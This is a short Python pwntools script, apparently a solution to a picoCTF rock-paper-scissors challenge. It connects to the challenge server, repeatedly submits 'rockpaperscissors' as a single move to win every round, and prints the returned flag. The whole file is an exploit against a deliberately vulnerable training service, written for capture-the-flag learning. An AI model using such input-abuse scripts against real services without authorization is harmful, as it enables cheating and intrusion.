# picoCTF-rps-exploit.py
# by Aidan Wech (ahwech)
# nc saturn.picoctf.net xxxxx

from pwn import *

def main():
    # connection variables (remember to start up instance on picoCTF, port will vary!)
    host = "saturn.picoctf.net"
    port = 58516

    # variables
    payload = "rockpaperscissors"

    # connect to instance and deliver payload
    p = remote(host, port)
    for i in range(5):
        p.recvuntil(b'program\r\n', timeout=1)
        p.sendline(b"1")
        p.recvuntil(b'(rock/paper/scissors):\r\n', timeout=1)
        p.sendline(payload)
        p.recvuntil(b'again?\r\n', timeout=1)

    p.recvline(timeout=1)
    flag = p.recvline(timeout=1).decode().rstrip("\n")
    p.close()

    # print flag
    log.info(f"flag: {flag}")

if __name__ == "__main__":
    main()